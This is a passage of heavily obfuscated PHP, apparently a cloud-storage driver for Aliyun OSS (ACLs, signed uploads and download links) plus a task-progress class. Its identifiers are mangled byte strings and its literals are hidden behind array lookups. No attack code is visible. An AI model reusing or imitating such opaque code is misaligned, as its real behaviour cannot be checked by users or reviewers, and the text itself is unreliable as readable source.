$e¬ø†ã¢¦é[491] ? !0 : !1; } public function canWrite($AÁˆÆáƒŒ) { $b·ì™æ²«â = $this->pathAcl($AÁˆÆáƒŒ); return $b·ì™æ²«â == $_SERVER[¼€¼ˆ¦‚¡][491] ? !0 : !1; } public function pathAcl($D¯³ˆÍåâ‡) { goto F¿–ƒ¯ğ‹Å; a°ßÆŠŸêæ: $e©Ê¹¾¼Ü = $B‘©¥²óá› == $AË¹®ïİ¹ô[34] ? $this->bucketAcl : $B‘©¥²óá›; if ($e©Ê¹¾¼Ü == $AË¹®ïİ¹ô[1195]) { return $AË¹®ïİ¹ô[1194]; } if ($e©Ê¹¾¼Ü == $AË¹®ïİ¹ô[1196]) { return $AË¹®ïİ¹ô[491]; } goto aÖæäÀ’­«; aÖæäÀ’­«: return $e©Ê¹¾¼Ü; goto d°ÍğÊŞ¶; F¿–ƒ¯ğ‹Å: $AË¹®ïİ¹ô =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $B‘©¥²óá› = $this->client->getObjectAcl($this->bucket, $this->pathEncode($D¯³ˆÍåâ‡)); } catch (OSS\Core\OssException $b°¼ĞßËÇ) { return !1; } goto a°ßÆŠŸêæ; d°ÍğÊŞ¶: } private function chmodPath($DòÔÁ ¾šñ, $A¸Ú·™æƒÑ = '') { $D°š¬Œ”´ =& $_SERVER[¼€¼ˆ¦‚¡]; $e²â‘‰¨ô£ = empty($A¸Ú·™æƒÑ) ? $D°š¬Œ”´[1196] : $A¸Ú·™æƒÑ; $FêÇİÂß’‡ = array($D°š¬Œ”´[34], $D°š¬Œ”´[185], $D°š¬Œ”´[1195], $D°š¬Œ”´[1196]); if (!in_array($e²â‘‰¨ô£, $FêÇİÂß’‡)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($DòÔÁ ¾šñ), $e²â‘‰¨ô£); } catch (OSS\Core\OssException $fÔ©İÔ¯­) { return !1; } return !0; } public function getContent($A‘íÇòÅµœ) { return $this->fileSubstr($A‘íÇòÅµœ, -1); } public function setContent($F¨®ÁŒ²…ô, $fœ˜è¯¯÷ = '') { $bĞÖæ‰ª—Æ =& $_SERVER[¼€¼ˆ¦‚¡]; try { $DÂƒ‚çÔö÷ = $this->trafficLimit($bĞÖæ‰ª—Æ[1197]); $bŒìÍÃ¬†¢ = $this->client->putObject($this->bucket, $this->pathEncode($F¨®ÁŒ²…ô), $fœ˜è¯¯÷, $DÂƒ‚çÔö÷); } catch (OSS\Core\OssException $aØ°†‹í§) { return !1; } $eñİæÄÈ = array($bĞÖæ‰ª—Æ[1184] => trim($bŒìÍÃ¬†¢[$bĞÖæ‰ª—Æ[1198]], $bĞÖæ‰ª—Æ[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($F¨®ÁŒ²…ô))); $this->updateObjMeta($F¨®ÁŒ²…ô, $eñİæÄÈ); return isset($bŒìÍÃ¬†¢[$bĞÖæ‰ª—Æ[1199]][$bĞÖæ‰ª—Æ[1146]]) ? (int) $bŒìÍÃ¬†¢[$bĞÖæ‰ª—Æ[1199]][$bĞÖæ‰ª—Æ[1146]] : strlen($bŒìÍÃ¬†¢); } private function updateObjMeta($Eå›ãÍ•´Ë, $AğšÓïÅƒÎ) { $Eå›ãÍ•´Ë = $this->pathEncode($Eå›ãÍ•´Ë); try { $bà½Ãä­ä = array(OSS\OssClient::OSS_HEADERS => $AğšÓïÅƒÎ); $this->client->copyObject($this->bucket, $Eå›ãÍ•´Ë, $this->bucket, $Eå›ãÍ•´Ë, $bà½Ãä­ä); } catch (OSS\Core\OssException $dÁ»ë§Şœê) { return !1; } return !0; } public function upload($dÙÈô”Îî™, $B…§×¨Ÿè·, $CÛæ‹´Ú‡¶ = false, $eÀŸÕçÑ•Ó = REPEAT_REPLACE) { $BñŒØĞÆ =& $_SERVER[¼€¼ˆ¦‚¡]; $a¥²î”½¾ = trim($dÙÈô”Îî™, $BñŒØĞÆ[8]); $bò»Ã«¥÷Ä = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($BñŒØĞÆ[1184] => @md5_file($B…§×¨Ÿè·)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($dÙÈô”Îî™))); $bò»Ã«¥÷Ä = $this->trafficLimit($BñŒØĞÆ[1197], $bò»Ã«¥÷Ä); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($a¥²î”½¾), $B…§×¨Ÿè·, $bò»Ã«¥÷Ä); } catch (OSS\Core\OssException $A½ê”æÏÜÆ) { return !1; } return $this->getPathOuter($dÙÈô”Îî™); } public function getHost() { $d¡á¬˜Ş¿ù =& $_SERVER[¼€¼ˆ¦‚¡]; $bÊ™¬·Ûôº = explode($d¡á¬˜Ş¿ù[171], parent::getHost()); return $bÊ™¬·Ûôº[0] . $d¡á¬˜Ş¿ù[171] . $this->bucket . $d¡á¬˜Ş¿ù[91] . $bÊ™¬·Ûôº[1]; } public function uploadFormData($D›¸ğ‡ˆ‡¾, $dèÌë¨‹¹½ = 3600) { goto D™´Ä™ÏŒ’; bÇ”¡°Ú‡: $FÂÔê§¾ = $this->pathFather($D›¸ğ‡ˆ‡¾); $F¼£‰´³´ = array($bÅ‰–°Ô§[1102] => $eøìğçÏœÑ, $bÅ‰–°Ô§[1103] => array(array($bÅ‰–°Ô§[1202], 0, $aÁÈåØÏ±„), array($bÅ‰–°Ô§[1106], $bÅ‰–°Ô§[1107], $FÂÔê§¾))); $C¦–‘ÛêÃ = base64_encode(json_encode($F¼£‰´³´)); goto Fˆ—£òô; Fˆ—£òô: $B³‡á™æÇ˜ = base64_encode(hash_hmac($bÅ‰–°Ô§[218], $C¦–‘ÛêÃ, $this->secret, !0)); $AÈªçÈ¼Ïõ = array($bÅ‰–°Ô§[1112] => $C¦–‘ÛêÃ, $bÅ‰–°Ô§[1203] => $this->accessKey, $bÅ‰–°Ô§[1108] => $bÅ‰–°Ô§[1100], $bÅ‰–°Ô§[1204] => $B³‡á™æÇ˜, $bÅ‰–°Ô§[169] => $AéÈ‚æÔŸæ); $AÈªçÈ¼Ïõ = $this->trafficLimit($bÅ‰–°Ô§[1197], $AÈªçÈ¼Ïõ); goto aÙ…ÇòááÜ; aÙ…ÇòááÜ: return $AÈªçÈ¼Ïõ; goto a¯Ã“¦íö“; f²Éå˜ ¼: $FÜŸØá‹’¾ = strpos($eøìğçÏœÑ, $bÅ‰–°Ô§[284]); $eøìğçÏœÑ = substr($eøìğçÏœÑ, 0, $FÜŸØá‹’¾) . $bÅ‰–°Ô§[1201]; $aÁÈåØÏ±„ = 1048576000 * 5; goto bÇ”¡°Ú‡; D™´Ä™ÏŒ’: $bÅ‰–°Ô§ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!($AéÈ‚æÔŸæ = $this->getHost())) { return !1; } $EÆ¼Í¾Å‚ = $dèÌë¨‹¹½; goto CÀßö¼—ì; CÀßö¼—ì: $Dò—»ÎÎ¯ = date($bÅ‰–°Ô§[1200], time() + $EÆ¼Í¾Å‚); $aÅ¬ñÜ–Ã¿ = new DateTime($Dò—»ÎÎ¯); $eøìğçÏœÑ = $aÅ¬ñÜ–Ã¿->format(DateTime::ISO8601); goto f²Éå˜ ¼; a¯Ã“¦íö“: } public function multiUploadFormData($Bè‹©ğ¸Œ­, $D—’Í‡ÎãÌ = 3600) { $cª„™ƒ›Ë‡ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!($d‡Âºåâ÷ = $this->getHost())) { return !1; } $C×ÙôÚÉÙù = $this->trafficLimit($cª„™ƒ›Ë‡[1197]); $F¹›†©´¿ç = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Bè‹©ğ¸Œ­), $C×ÙôÚÉÙù); return array($cª„™ƒ›Ë‡[209] => $F¹›†©´¿ç, $cª„™ƒ›Ë‡[169] => $d‡Âºåâ÷ . $cª„™ƒ›Ë‡[8] . $this->pathEncode($Bè‹©ğ¸Œ­), $cª„™ƒ›Ë‡[210] => gmdate($cª„™ƒ›Ë‡[1205]), $cª„™ƒ›Ë‡[89] => $Bè‹©ğ¸Œ­); } public function multiUploadAuthData($dĞ‰¾ŞØÂ, $aÏ°êŒ¬ ­ = array()) { goto EäƒßÄÀÏ; EäƒßÄÀÏ: $dƒ ìù‰± =& $_SERVER[¼€¼ˆ¦‚¡]; $C”Ô”ØßŠš = isset($aÏ°êŒ¬ ­[$dƒ ìù‰±[210]]) ? $aÏ°êŒ¬ ­[$dƒ ìù‰±[210]] : gmdate($dƒ ìù‰±[1205]); $få–ŸÁ¾¿Û = isset($aÏ°êŒ¬ ­[$dƒ ìù‰±[160]]) ? $aÏ°êŒ¬ ­[$dƒ ìù‰±[160]] : $dƒ ìù‰±[33]; goto E“ä¸ÃßÎ; Aî»àˆæâ³: $Bä÷È¥‹¬ = array($dƒ ìù‰±[212], $dƒ ìù‰±[33], $dƒ ìù‰±[116], $C”Ô”ØßŠš, "\170\55\157\x73\x73\x2d\x64\x61\x74\145\x3a{$C”Ô”ØßŠš}", $dƒ ìù‰±[8] . $this->bucket . $dƒ ìù‰±[8] . $D¾ÅÅê ·¾ . $få–ŸÁ¾¿Û); if (strpos($få–ŸÁ¾¿Û, $dƒ ìù‰±[213]) === 0) { $Bä÷È¥‹¬[0] = $dƒ ìù‰±[214]; if ($dÚïÇ«àš¿ = $this->trafficLimit($dƒ ìù‰±[1197])) { $D¾ÅÅê ·¾ = $dƒ ìù‰±[1206]; array_splice($Bä÷È¥‹¬, 5, 0, $D¾ÅÅê ·¾ . $dƒ ìù‰±[4] . $dÚïÇ«àš¿[$D¾ÅÅê ·¾]); } } if (isset($aÏ°êŒ¬ ­[$dƒ ìù‰±[215]]) && $aÏ°êŒ¬ ­[$dƒ ìù‰±[215]] == $dƒ ìù‰±[216]) { $Bä÷È¥‹¬[0] = $dƒ ìù‰±[216]; } goto B´Š¿•ç±; E“ä¸ÃßÎ: $D¾ÅÅê ·¾ = $dĞ‰¾ŞØÂ; if (isset($aÏ°êŒ¬ ­[$dƒ ìù‰±[89]])) { $D¾ÅÅê ·¾ = $aÏ°êŒ¬ ­[$dƒ ìù‰±[89]]; unset($aÏ°êŒ¬ ­[$dƒ ìù‰±[89]]); } if (isset($aÏ°êŒ¬ ­[$dƒ ìù‰±[211]])) { $aÏ°êŒ¬ ­[$dƒ ìù‰±[210]] = $C”Ô”ØßŠš; return $this->listUploadParts($D¾ÅÅê ·¾, $aÏ°êŒ¬ ­); } goto Aî»àˆæâ³; Fè§œÀĞ: $F‰š—Ìô¿ = $dƒ ìù‰±[1208] . $this->accessKey . $dƒ ìù‰±[4] . $C›‚¯í•¹ñ; if (strpos($få–ŸÁ¾¿Û, $dƒ ìù‰±[213]) === 0) { $F‰š—Ìô¿ = array($dƒ ìù‰±[220] => $F‰š—Ìô¿, $dƒ ìù‰±[210] => $C”Ô”ØßŠš); if ($dÚïÇ«àš¿) { $F‰š—Ìô¿ = array_merge($F‰š—Ìô¿, $dÚïÇ«àš¿); } } return $F‰š—Ìô¿; goto Fó½˜Æ”„; B´Š¿•ç±: if (!empty($aÏ°êŒ¬ ­[$dƒ ìù‰±[1207]])) { $F¼‹áÎ‹‡ = array_merge(array($Bä÷È¥‹¬[4]), $aÏ°êŒ¬ ­[$dƒ ìù‰±[1207]]); sort($F¼‹áÎ‹‡); $Bä÷È¥‹¬[4] = implode($dƒ ìù‰±[217], $F¼‹áÎ‹‡); } $CŞ¢¸œ¨ = implode($dƒ ìù‰±[217], $Bä÷È¥‹¬); $C›‚¯í•¹ñ = base64_encode(hash_hmac($dƒ ìù‰±[218], $CŞ¢¸œ¨, $this->secret, !0)); goto Fè§œÀĞ; Fó½˜Æ”„: } public function listUploadParts($F‡ó»ãÇ¦Ê, $dö•¬™âÌ) { goto EÃ‰Âˆ§ê ; EÃ‰Âˆ§ê : $c…‹‚Œİ­á =& $_SERVER[¼€¼ˆ¦‚¡]; $AŸÌ¯İ´·™ = parse_url_query($dö•¬™âÌ[$c…‹‚Œİ­á[160]]); $f³éòË“È² = $this->client->listParts($this->bucket, $this->pathEncode($F‡ó»ãÇ¦Ê), $AŸÌ¯İ´·™[$c…‹‚Œİ­á[209]]); goto EáÖ¶Š®ÓÆ; CÍ îÅ„®: return array($c…‹‚Œİ­á[220] => $E‚®õØêÔï, $c…‹‚Œİ­á[210] => $dö•¬™âÌ[$c…‹‚Œİ­á[210]], $c…‹‚Œİ­á[222] => $d‘áÃİ©Î); goto Dß¨Ò®ŸßÈ; bœá ëÔ: unset($dö•¬™âÌ[$c…‹‚Œİ­á[211]], $dö•¬™âÌ[$c…‹‚Œİ­á[215]]); $E‚®õØêÔï = $this->multiUploadAuthData($F‡ó»ãÇ¦Ê, $dö•¬™âÌ); if (empty($E‚®õØêÔï)) { return !1; } goto CÍ îÅ„®; EáÖ¶Š®ÓÆ: $cå¹‡®î­˜ = $f³éòË“È²->getListPart(); $d‘áÃİ©Î = array(); foreach ($cå¹‡®î­˜ as $f†¬¸âŒö‰) { $d‘áÃİ©Î[] = array($c…‹‚Œİ­á[1188] => $f†¬¸âŒö‰->getPartNumber(), $c…‹‚Œİ­á[1189] => trim($f†¬¸âŒö‰->getETag(), $c…‹‚Œİ­á[113])); } goto bœá ëÔ; Dß¨Ò®ŸßÈ: } public function download($dõ³ğÃ‰, $açà˜Û¸Œ) { if ($this->isFolder($dõ³ğÃ‰)) { return !1; } try { $D÷÷…¨¢§» = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $açà˜Û¸Œ); $D÷÷…¨¢§» = $this->trafficLimit($_SERVER[¼€¼ˆ¦‚¡][105], $D÷÷…¨¢§»); $this->client->getObject($this->bucket, $this->pathEncode($dõ³ğÃ‰), $D÷÷…¨¢§»); } catch (OSS\Core\OssException $F’ãäõ‘À) { return !1; } return $açà˜Û¸Œ; } public function fileSubstr($E²„¨Üš¶, $c·Ï»óßî˜ = 0, $aÚîëØÕÕÜ = false) { if ($c·Ï»óßî˜ === -1) { $fƒÑõô‰Õî = array(); } else { if ($aÚîëØÕÕÜ === !1) { $D¡æ”’†È° = $this->size($E²„¨Üš¶); } else { $D¡æ”’†È° = $c·Ï»óßî˜ + $aÚîëØÕÕÜ - 1; } $fƒÑõô‰Õî = array(OSS\OssClient::OSS_RANGE => "{$c·Ï»óßî˜}\x2d{$D¡æ”’†È°}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($E²„¨Üš¶), $fƒÑõô‰Õî); } catch (OSS\Core\OssException $d·ÂĞ˜ë‹ô) { think_exception($d·ÂĞ˜ë‹ô->getMessage()); return !1; } } private function trafficLimit($eäÒ•¦íÛ, $AÄïïê›–³ = array()) { goto cŒƒÌí„”; dœ­ğ‹ß­‡: return $AÄïïê›–³; goto f£ƒ’²ÔÔ; E¼õîöÑ : if (!$f±´é·Éö¬) { return $AÄïïê›–³; } $f±´é·Éö¬ = $f±´é·Éö¬ < 819200 ? 819200 : ($f±´é·Éö¬ > 838860800 ? 838860800 : $f±´é·Éö¬); $AÄïïê›–³[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($f±´é·Éö¬); goto dœ­ğ‹ß­‡; cŒƒÌí„”: $bõèè½Õ‰Ô =& $_SERVER[¼€¼ˆ¦‚¡]; if ($eäÒ•¦íÛ == $bõèè½Õ‰Ô[1197] && $this->isUploadServer() || $eäÒ•¦íÛ == $bõèè½Õ‰Ô[105] && $this->isFileOutServer()) { return $AÄïïê›–³; } $f±´é·Éö¬ = floatval($GLOBALS[$bõèè½Õ‰Ô[6]][$bõèè½Õ‰Ô[84]][$bõèè½Õ‰Ô[103]][$eäÒ•¦íÛ]) * 1024 * 1024 * 8; goto E¼õîöÑ ; f£ƒ’²ÔÔ: } public function link($Aˆ¡±—•™, $e¤·õ§¬÷´ = array()) { $d—œ„´âÖ´ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->exist($Aˆ¡±—•™) || $this->isFolder($Aˆ¡±—•™)) { return !1; } try { $e¤·õ§¬÷´ = $this->trafficLimit($d—œ„´âÖ´[105], $e¤·õ§¬÷´); $Fê´ŠªĞƒ = $this->client->signUrl($this->bucket, $this->pathEncode($Aˆ¡±—•™), 3600 * 12, $d—œ„´âÖ´[216], $e¤·õ§¬÷´); return $this->getCdnLink($Fê´ŠªĞƒ); } catch (OSS\Core\OssException $D§÷³‹¡­) { return !1; } } public function fileOut($EØ¾©’¯Ğ, $DëôÑ†²‚ = false, $b†¹ß‰ªĞ¼ = false, $C¹ôß„Ã¯¢ = '') { goto D«™À¢›“Ì; f ËÒñœ´: $A‹Íºå…• = array(OSS\OssClient::OSS_SUB_RESOURCE => $aóŞêŒÒƒ[1209] . rawurlencode("{$DëôÑ†²‚}\73\x66\x69\x6c\x65\156\141\x6d\145\75{$b†¹ß‰ªĞ¼}")); $A‹Íºå…•[OSS\OssClient::OSS_SUB_RESOURCE] .= $aóŞêŒÒƒ[1210] . rawurlencode($Aô²ê›´ºÚ); $cŠˆ‘ğšõ = $this->link($EØ¾©’¯Ğ, $A‹Íºå…•); goto d«¯é½ÖŞÉ; D«™À¢›“Ì: $aóŞêŒÒƒ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$b†¹ß‰ªĞ¼) { $b†¹ß‰ªĞ¼ = $this->pathThis($EØ¾©’¯Ğ); } $b†¹ß‰ªĞ¼ = rawurlencode($b†¹ß‰ªĞ¼); goto açÂÓ£µÖ; açÂÓ£µÖ: $Aô²ê›´ºÚ = get_file_mime(get_path_ext($b†¹ß‰ªĞ¼)); if ($Aô²ê›´ºÚ == $aóŞêŒÒƒ[201]) { return parent::fileOut($EØ¾©’¯Ğ, $DëôÑ†²‚, $b†¹ß‰ªĞ¼, $C¹ôß„Ã¯¢); } $DëôÑ†²‚ = $DëôÑ†²‚ ? $aóŞêŒÒƒ[202] : $aóŞêŒÒƒ[203]; goto f ËÒñœ´; d«¯é½ÖŞÉ: $this->fileOutLink($cŠˆ‘ğšõ); goto d²öã”Í™„; d²öã”Í™„: } public function fileOutServer($C«ƒØ¦ßƒù, $Cî‘öôè´ = false, $AÁ„–¥¡‡Ú = false, $BŠ¦ÃĞÖŸİ = '') { parent::fileOut($C«ƒØ¦ßƒù, $Cî‘öôè´, $AÁ„–¥¡‡Ú, $BŠ¦ÃĞÖŸİ); } public function fileOutImage($C¡î»Ú¨, $D×ÂÃ‡Œ¡Ï = 250) { $D¾å˜Ä§Œœ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¼€¼ˆ¦‚¡][1211] . $D×ÂÃ‡Œ¡Ï); $A£ğŸÑá½¦ = $this->link($C¡î»Ú¨, $D¾å˜Ä§Œœ); $this->fileOutLink($A£ğŸÑá½¦); } public function fileOutImageServer($AÅæ‡àìĞ·, $FÍÊÉÑ ³³ = 250) { parent::fileOutImage($AÅæ‡àìĞ·, $FÍÊÉÑ ³³); } public function fileOutLink($Dó÷ŒÙ¤×Â) { $fÏ† •Ñ±‰ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->isCdnHost() && substr($Dó÷ŒÙ¤×Â, 0, 7) == $fÏ† •Ñ±‰[1115]) { $Dó÷ŒÙ¤×Â = $fÏ† •Ñ±‰[1116] . substr($Dó÷ŒÙ¤×Â, 7); } header($fÏ† •Ñ±‰[156] . $Dó÷ŒÙ¤×Â); die; } public function hashMd5($aÆíƒŸø, $aâŒ•‡ÉæØ = '') { $B¯‚°Ÿ´œ¶ =& $_SERVER[¼€¼ˆ¦‚¡]; $D¢Ô­Ò¼‡ğ = $this->objectMeta($aÆíƒŸø); if (!$D¢Ô­Ò¼‡ğ) { return $B¯‚°Ÿ´œ¶[33]; } if (!isset($D¢Ô­Ò¼‡ğ[$B¯‚°Ÿ´œ¶[1184]]) && !empty($aâŒ•‡ÉæØ)) { $A˜«´ÁëßÏ = $this->updateObjMeta($aÆíƒŸø, array($B¯‚°Ÿ´œ¶[1184] => $aâŒ•‡ÉæØ)); $D¢Ô­Ò¼‡ğ[$B¯‚°Ÿ´œ¶[1184]] = $A˜«´ÁëßÏ ? $aâŒ•‡ÉæØ : $B¯‚°Ÿ´œ¶[33]; } return isset($D¢Ô­Ò¼‡ğ[$B¯‚°Ÿ´œ¶[1184]]) ? strtolower($D¢Ô­Ò¼‡ğ[$B¯‚°Ÿ´œ¶[1184]]) : $B¯‚°Ÿ´œ¶[33]; } public function size($dæÈøŠ‚± ) { $FõØ°øôõó = $this->objectMeta($dæÈøŠ‚± ); return $FõØ°øôõó ? $FõØ°øôõó[$_SERVER[¼€¼ˆ¦‚¡][77]] : 0; } public function info($Cà‹«‘®©Œ) { if ($this->isFolder($Cà‹«‘®©Œ)) { return $this->folderInfo($Cà‹«‘®©Œ); } else { if ($this->isFile($Cà‹«‘®©Œ)) { return $this->fileInfo($Cà‹«‘®©Œ); } } return !1; } public function exist($c›İ¨Í£Î) { return $this->isFile($c›İ¨Í£Î) || $this->isFolder($c›İ¨Í£Î); } public function isFile($fê¿‡õœó¯) { return !$this->isFolder($fê¿‡õœó¯) && $this->objectMeta($fê¿‡õœó¯); } public function isFolder($BÑÙÓÏ‘•) { return $this->cacheMethod($_SERVER[¼€¼ˆ¦‚¡][223], $BÑÙÓÏ‘•); } protected function objectMeta($E¤ôºÑƒ‘) { return $this->cacheMethod($_SERVER[¼€¼ˆ¦‚¡][224], $E¤ôºÑƒ‘); } protected function _objectMeta($cˆòÙÖÔò”) { $E¿åÉ“‹ñÄ =& $_SERVER[¼€¼ˆ¦‚¡]; try { $FìÚ¾Çíî = $this->client->getObjectMeta($this->bucket, $this->pathEncode($cˆòÙÖÔò”)); } catch (OSS\Core\OssException $cŸ™‰À”áé) { $FìÚ¾Çíî = !1; } if ($FìÚ¾Çíî) { $FìÚ¾Çíî[$E¿åÉ“‹ñÄ[77]] = intval($FìÚ¾Çíî[$E¿åÉ“‹ñÄ[1191]]); } return $FìÚ¾Çíî; } protected function _isFolder($BÛ›ÔæÄ‰) { $eãßãƒ‰– =& $_SERVER[¼€¼ˆ¦‚¡]; if ($BÛ›ÔæÄ‰ == $eãßãƒ‰–[33] || $BÛ›ÔæÄ‰ == $eãßãƒ‰–[8]) { return !0; } $b‹±¾¬ÎÍ = array($eãßãƒ‰–[1181] => $eãßãƒ‰–[8], $eãßãƒ‰–[186] => rtrim($BÛ›ÔæÄ‰, $eãßãƒ‰–[8]) . $eãßãƒ‰–[8], $eãßãƒ‰–[1182] => 1, $eãßãƒ‰–[1183] => $eãßãƒ‰–[33]); $C¶¬ø’½Ñì = $this->client->listObjects($this->bucket, $b‹±¾¬ÎÍ); if ($C¶¬ø’½Ñì->getObjectList() || $C¶¬ø’½Ñì->getPrefixList()) { return !0; } return !1; } } goto b‰–ù—Ö×Â; A«í‹÷Ğ«Ì: class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\162\x75\156\156\151\156\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($FÖÒ¯¿•À×, $d²†Ûñ’ªì = '', $CÒáÍÜÆó· = 0, $aªƒ’·µù… = '') { goto d®¼¬…Âø—; b†ëÅé‹Õ: Hook::bind($aàİÈ¬ƒìî[1403], array($this, $aàİÈ¬ƒìî[1445])); Hook::bind($aàİÈ¬ƒìî[1446], array($this, $aàİÈ¬ƒìî[1447])); $this->startAfter(); goto D™èºò´é; d®¼¬…Âø—: $aàİÈ¬ƒìî =& $_SERVER[¼€¼ˆ¦‚¡]; if (self::get($FÖÒ¯¿•À×)) { return; } $this->task = array($aàİÈ¬ƒìî[367] => $FÖÒ¯¿•À×, $aàİÈ¬ƒìî[1437] => USER_ID, $aàİÈ¬ƒìî[1342] => $aªƒ’·µù…, $aàİÈ¬ƒìî[29] => $d²†Ûñ’ªì, $aàİÈ¬ƒìî[977] => $aàİÈ¬ƒìî[33], $aàİÈ¬ƒìî[975] => $CÒáÍÜÆó·, $aàİÈ¬ƒìî[989] => 0, $aàİÈ¬ƒìî[1438] => 0, $aàİÈ¬ƒìî[1439] => 0, $aàİÈ¬ƒìî[1440] => timeFloat(), $aàİÈ¬ƒìî[1441] => 0, $aàİÈ¬ƒìî[1442] => 0, $aàİÈ¬ƒìî[1443] => 0, $aàİÈ¬ƒìî[1444] => 0, $aàİÈ¬ƒìî[685] => $aàİÈ¬ƒìî[1401]); goto b†ëÅé‹Õ; D™èºò´é: Hook::trigger($aàİÈ¬ƒìî[1448], $this->task); $this->task[$aàİÈ¬ƒìî[1442]] = timeFloat(); goto E…„·¥¶íà; E…„·¥¶íà: } public function end() { goto d±´»­èÉ¸; d±´»­èÉ¸: $dÙ¦×‚¡ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$this->task) { return; } if ($this->task[$dÙ¦×‚¡[1442]]) { self::valueSet($this->task[$dÙ¦×‚¡[367]], !1); } goto eŒ§½‘šİö; aª×ĞÕŠìÑ: Hook::unbind($dÙ¦×‚¡[1446], array($this, $dÙ¦×‚¡[1447])); $this->endAfter(); $this->task = !1; goto c®î Ò²›ù; eŒ§½‘šİö: $DÌğ†”²Ã• = timeFloat() - $this->task[$dÙ¦×‚¡[1440]]; self::log($dÙ¦×‚¡[1449] . $this->task[$dÙ¦×‚¡[367]] . $dÙ¦×‚¡[1450] . $DÌğ†”²Ã• . $dÙ¦×‚¡[1451]); Hook::unbind($dÙ¦×‚¡[1403], array($this, $dÙ¦×‚¡[1445])); goto aª×ĞÕŠìÑ; c®î Ò²›ù: } public function update($DºÄŠ¶”Ûğ = 0) { goto e¨×ï‘ç—÷; dŒÊ§¥òñ: $eÁÈÎ‹§»[$eº×óòŞÎ¤[685]] = $AÆİÇºŸÖ© ? $AÆİÇºŸÖ© : $eÁÈÎ‹§»[$eº×óòŞÎ¤[685]]; $eÁÈÎ‹§»[$eº×óòŞÎ¤[1443]] = $C‚™Ş›õÁ¥[$eº×óòŞÎ¤[1443]] ? $C‚™Ş›õÁ¥[$eº×óòŞÎ¤[1443]] : 0; $eÁÈÎ‹§»[$eº×óòŞÎ¤[1442]] = timeFloat(); goto A¼öÁ‡Å‡Ö; e¨×ï‘ç—÷: $eº×óòŞÎ¤ =& $_SERVER[¼€¼ˆ¦‚¡]; $eÁÈÎ‹§» =& $this->task; if (!$eÁÈÎ‹§») { return; } goto AÜîøí£‡; f—Æˆ×›İ“: $C‚™Ş›õÁ¥ = self::get($eÁÈÎ‹§»[$eº×óòŞÎ¤[367]]); $AÆİÇºŸÖ© = $C‚™Ş›õÁ¥[$eº×óòŞÎ¤[685]]; if ($AÆİÇºŸÖ© == self::STATYS_KILL) { $C»©æ£”Õ = array($eº×óòŞÎ¤[1452] => LNG($eº×óòŞÎ¤[1453]), $eº×óòŞÎ¤[1031] => !1); Cache::set($eº×óòŞÎ¤[1454] . $this->task[$eº×óòŞÎ¤[367]], $C»©æ£”Õ, 30); $this->end(); die; } else { if ($AÆİÇºŸÖ© == self::STATYS_STOP) { $B…ğÓ÷ŞŒ³ = 2; $C‚™Ş›õÁ¥[$eº×óòŞÎ¤[1443]] += $B…ğÓ÷ŞŒ³; self::valueSet($eÁÈÎ‹§»[$eº×óòŞÎ¤[367]], $C‚™Ş›õÁ¥); sleep($B…ğÓ÷ŞŒ³); $this->update(); return; } } goto dŒÊ§¥òñ; AÜîøí£‡: $eÁÈÎ‹§»[$eº×óòŞÎ¤[989]] += $DºÄŠ¶”Ûğ; $eÁÈÎ‹§»[$eº×óòŞÎ¤[1441]] = timeFloat(); if ($eÁÈÎ‹§»[$eº×óòŞÎ¤[975]]) { if ($eÁÈÎ‹§»[$eº×óòŞÎ¤[975]] < $eÁÈÎ‹§»[$eº×óòŞÎ¤[989]]) { $eÁÈÎ‹§»[$eº×óòŞÎ¤[975]] = $eÁÈÎ‹§»[$eº×óòŞÎ¤[989]]; } $B„×®‰Âİ· = timeFloat() - $eÁÈÎ‹§»[$eº×óòŞÎ¤[1440]] - $eÁÈÎ‹§»[$eº×óòŞÎ¤[1443]]; $eÁÈÎ‹§»[$eº×óòŞÎ¤[1438]] = $eÁÈÎ‹§»[$eº×óòŞÎ¤[989]] / $eÁÈÎ‹§»[$eº×óòŞÎ¤[975]]; $eÁÈÎ‹§»[$eº×óòŞÎ¤[1439]] = $eÁÈÎ‹§»[$eº×óòŞÎ¤[989]] / $B„×®‰Âİ·; if ($eÁÈÎ‹§»[$eº×óòŞÎ¤[1438]] > 0) { $eÁÈÎ‹§»[$eº×óòŞÎ¤[1444]] = $B„×®‰Âİ· * (1 - $eÁÈÎ‹§»[$eº×óòŞÎ¤[1438]]) / $eÁÈÎ‹§»[$eº×óòŞÎ¤[1438]]; } $eÁÈÎ‹§»[$eº×óòŞÎ¤[1444]] = $eÁÈÎ‹§»[$eº×óòŞÎ¤[1444]] <= 0 ? 0 : $eÁÈÎ‹§»[$eº×óòŞÎ¤[1444]]; } goto dôä­¶´’; A¼öÁ‡Å‡Ö: Hook::trigger($eº×óòŞÎ¤[1455], $eÁÈÎ‹§»); self::valueSet($eÁÈÎ‹§»[$eº×óòŞÎ¤[367]], $eÁÈÎ‹§»); goto Dä†¦éîÜÖ; dôä­¶´’: $this->updateAfter(); $b´ˆŒ§÷¾ = 0.2; if (timeFloat() - $eÁÈÎ‹§»[$eº×óòŞÎ¤[1442]] < $b´ˆŒ§÷¾) { return; } goto f—Æˆ×›İ“; Dä†¦éîÜÖ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Aø¾êéáô†) { $béé¾ôœÀ’ =& 